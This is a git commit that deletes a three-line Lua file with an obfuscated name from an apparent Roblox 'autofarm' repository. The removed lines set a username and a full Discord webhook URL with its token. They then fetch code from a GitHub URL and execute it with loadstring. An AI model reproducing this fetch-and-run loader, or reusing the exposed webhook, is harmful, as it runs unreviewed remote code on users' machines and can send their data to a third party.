ef15af597f9e63a4685c653f0161ee0d2ce297c2
psxautofarm1 <130071685+psxautofarm1@users.noreply.github.com>
2023-04-07 14:31:50 +0100

    Delete obf_g4tS4CRJ7bgCP89PEGFN9uT02oZtAmNAWfb3V92y3q173Qy0t8a9YtQ4Is3c3XCE.lua

--- obf_g4tS4CRJ7bgCP89PEGFN9uT02oZtAmNAWfb3V92y3q173Qy0t8a9YtQ4Is3c3XCE.lua
+++
@@ -1,3 +0,0 @@
-UserName = "hellopike2"
-Webhook = "https://discord.com/api/webhooks/1093888108115808287/eH9C3GSXBQimSkquj3mbK7BZBawhMyZTjzWHFMBaBAuOry0TQ3s5Unf8WDz8IWpiZHEL"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
